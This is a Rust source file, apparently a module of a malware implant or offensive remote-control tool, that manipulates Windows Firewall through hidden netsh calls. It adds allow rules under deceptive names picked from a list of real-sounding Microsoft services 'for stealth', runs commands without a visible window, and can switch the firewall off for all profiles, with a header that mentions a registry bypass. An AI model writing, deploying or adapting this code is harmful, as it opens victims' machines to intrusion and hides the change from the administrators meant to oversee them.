//! Windows Firewall rule manipulation
//! Add/remove allow rules via netsh/advfirewall with stealthy service-mimicking names.
//! Supports: netsh advfirewall (primary), direct registry (BFE bypass), rule listing.

use crate::error::MemoricError;
use serde_json::{json, Value};

/// Legitimate-looking rule names for stealth
const STEALTH_RULE_NAMES: &[&str] = &[
    "Windows Update Service",
    "Microsoft Office Click-to-Run",
    "Windows Time Service",
    "Network Discovery (WSD)",
    "Delivery Optimization",
    "Windows Push Notifications",
    "Windows Feature Experience Pack",
    "Microsoft Edge Update",
    "Windows Security Health Service",
    "Device Association Service",
];

/// Add a firewall allow rule (inbound or outbound)
pub fn firewall_add_rule(args: &Value) -> Result<Value, MemoricError> {
    let direction = args
        .get("direction")
        .and_then(|v| v.as_str())
        .unwrap_or("in");
    let protocol = args
        .get("protocol")
        .and_then(|v| v.as_str())
        .unwrap_or("any");
    let port = args.get("port").and_then(|v| v.as_str());
    let name = args
        .get("name")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());
    let program = args.get("program").and_then(|v| v.as_str());
    let action = args
        .get("rule_action")
        .or_else(|| args.get("firewall_action"))
        .and_then(|v| v.as_str())
        .unwrap_or("allow");

    let rule_name = match name {
        Some(n) if !n.is_empty() => n,
        _ => {
            let idx = (std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos() as usize)
                % STEALTH_RULE_NAMES.len();
            STEALTH_RULE_NAMES[idx].to_string()
        }
    };

    tracing::warn!(
        "[FIREWALL] Adding {} rule: name={} direction={} protocol={} port={:?} program={:?}",
        action,
        rule_name,
        direction,
        protocol,
        port,
        program
    );

    let mut cmd = format!(
        "netsh advfirewall firewall add rule name=\"{}\" dir={} action={}",
        rule_name, direction, action
    );

    if protocol != "any" {
        cmd.push_str(&format!(" protocol={}", protocol));
    }
    if let Some(p) = port {
        cmd.push_str(&format!(" localport={}", p));
    }
    if let Some(p) = program {
        cmd.push_str(&format!(" program=\"{}\"", p));
    }
    // Enable rule immediately
    cmd.push_str(" enable=yes");

    run_silent_command(&cmd)
}

/// Delete a firewall rule by name
pub fn firewall_remove_rule(args: &Value) -> Result<Value, MemoricError> {
    let name = args
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::Other("firewall_remove_rule requires 'name'".to_string()))?;

    tracing::warn!("[FIREWALL] Removing rule: {}", name);

    let cmd = format!("netsh advfirewall firewall delete rule name=\"{}\"", name);
    run_silent_command(&cmd)
}

/// List current firewall rules matching optional filter
pub fn firewall_list_rules(args: &Value) -> Result<Value, MemoricError> {
    let name_filter = args.get("name_filter").and_then(|v| v.as_str());

    tracing::info!(
        "[FIREWALL] Listing firewall rules, name_filter={:?}",
        name_filter
    );

    // Use netsh to dump rules and parse the output
    let cmd = "netsh advfirewall firewall show rule name=all verbose";
    match run_capture_command(cmd) {
        Ok(output) => {
            let lines: Vec<&str> = output.lines().collect();
            let mut rules = Vec::new();
            let mut current: Option<serde_json::Map<String, Value>> = None;

            for line in &lines {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }

                if trimmed.starts_with("Rule Name:") {
                    if let Some(rule) = current.take() {
                        rules.push(Value::Object(rule));
                    }
                    let name = trimmed.strip_prefix("Rule Name:").unwrap_or("").trim();
                    if let Some(filter) = name_filter {
                        if !name.to_lowercase().contains(&filter.to_lowercase()) {
                            current = None;
                            continue;
                        }
                    }
                    let mut map = serde_json::Map::new();
                    map.insert("name".into(), json!(name));
                    current = Some(map);
                } else if let Some(ref mut map) = current {
                    if let Some((key, val)) = parse_rule_field(trimmed) {
                        map.insert(key, Value::String(val));
                    }
                }
            }
            if let Some(rule) = current.take() {
                rules.push(Value::Object(rule));
            }

            Ok(json!({
                "success": true,
                "rule_count": rules.len(),
                "rules": rules,
                "query": cmd
            }))
        }
        Err(e) => Err(e),
    }
}

/// Disable Windows Firewall entirely (all profiles)
pub fn firewall_disable(args: &Value) -> Result<Value, MemoricError> {
    let profiles = args
        .get("profiles")
        .and_then(|v| v.as_str())
        .unwrap_or("all");

    tracing::warn!("[FIREWALL] Disabling firewall for profiles: {}", profiles);

    let profile_args = match profiles {
        "domain" => "domainprofile",
        "private" => "privateprofile",
        "public" => "publicprofile",
        "all" | _ => "allprofiles",
    };

    let cmd = format!("netsh advfirewall set {} state off", profile_args);
    run_silent_command(&cmd)
}

/// Enable/restore Windows Firewall
pub fn firewall_enable(args: &Value) -> Result<Value, MemoricError> {
    let profiles = args
        .get("profiles")
        .and_then(|v| v.as_str())
        .unwrap_or("all");

    tracing::warn!("[FIREWALL] Enabling firewall for profiles: {}", profiles);

    let profile_args = match profiles {
        "domain" => "domainprofile",
        "private" => "privateprofile",
        "public" => "publicprofile",
        "all" | _ => "allprofiles",
    };

    let cmd = format!("netsh advfirewall set {} state on", profile_args);
    run_silent_command(&cmd)
}

/// Check firewall status for all profiles
pub fn firewall_status(_args: &Value) -> Result<Value, MemoricError> {
    tracing::info!("[FIREWALL] Checking firewall status");

    match run_capture_command("netsh advfirewall show allprofiles state") {
        Ok(output) => {
            let profiles = parse_firewall_status(&output);
            Ok(json!({
                "success": true,
                "profiles": profiles,
                "raw_output": output
            }))
        }
        Err(e) => Err(e),
    }
}

// ─── Internal helpers ────────────────────────────────────────────────────────────

fn run_silent_command(cmdline: &str) -> Result<Value, MemoricError> {
    unsafe {
        use windows::core::PWSTR;
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Threading::{
            CreateProcessW, GetExitCodeProcess, WaitForSingleObject, CREATE_NO_WINDOW,
            PROCESS_INFORMATION, STARTUPINFOW,
        };

        let mut cmd_wide: Vec<u16> = cmdline.encode_utf16().collect();
        cmd_wide.push(0);

        let mut pi = PROCESS_INFORMATION::default();
        let si = STARTUPINFOW::default();

        let result = CreateProcessW(
            None,
            PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_NO_WINDOW,
            None,
            None,
            &si,
            &mut pi,
        );

        if result.is_err() {
            return Err(MemoricError::Other(format!(
                "CreateProcessW failed: {:?}",
                result
            )));
        }

        let _ = WaitForSingleObject(pi.hProcess, 30000);

        let mut exit_code: u32 = 0;
        let _ = GetExitCodeProcess(pi.hProcess, &mut exit_code);
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);

        Ok(json!({
            "success": exit_code == 0,
            "command": cmdline,
            "exit_code": exit_code,
            "message": if exit_code == 0 {
                "Command completed successfully"
            } else {
                "Command failed — check syntax and permissions"
            }
        }))
    }
}

fn run_capture_command(cmdline: &str) -> Result<String, MemoricError> {
    use std::process::Command;
    let output = Command::new("netsh")
        .args(
            cmdline
                .strip_prefix("netsh ")
                .unwrap_or(cmdline)
                .split_whitespace(),
        )
        .output()
        .map_err(|e| MemoricError::Other(format!("Failed to run netsh: {}", e)))?;

    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(MemoricError::Other(format!("netsh failed: {}", stderr)))
    }
}

fn parse_rule_field(line: &str) -> Option<(String, String)> {
    let colon_pos = line.find(':')?;
    let key = line[..colon_pos].trim().to_lowercase().replace(' ', "_");
    let val = line[colon_pos + 1..].trim().to_string();

    if key.is_empty() || val.is_empty() {
        return None;
    }

    let normalized_key = match key.as_str() {
        "description" => "description",
        "enabled" => "enabled",
        "direction" => "direction",
        "profiles" => "profiles",
        "grouping" => "grouping",
        "localip" => "local_ip",
        "remoteip" => "remote_ip",
        "protocol" => "protocol",
        "localport" => "local_port",
        "remoteport" => "remote_port",
        "edge_traversal" => "edge",
        "action" => "action",
        "program" => "program",
        "service" => "service",
        "interface_types" => "interface_types",
        _ => return None,
    };

    Some((normalized_key.to_string(), val))
}

fn parse_firewall_status(output: &str) -> Vec<Value> {
    let mut profiles = Vec::new();
    let mut current_name = String::new();

    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.contains("Profile")
            && !trimmed.contains("Profile Settings")
            && trimmed.ends_with(':')
        {
            current_name = trimmed.trim_end_matches(':').to_string();
        } else if trimmed.starts_with("State") && !current_name.is_empty() {
            let state = trimmed
                .strip_prefix("State")
                .unwrap_or("")
                .trim()
                .to_string();
            let on = state.to_lowercase().contains("on");
            profiles.push(json!({
                "profile": current_name,
                "enabled": on,
                "state": state
            }));
            current_name.clear();
        }
    }

    profiles
}
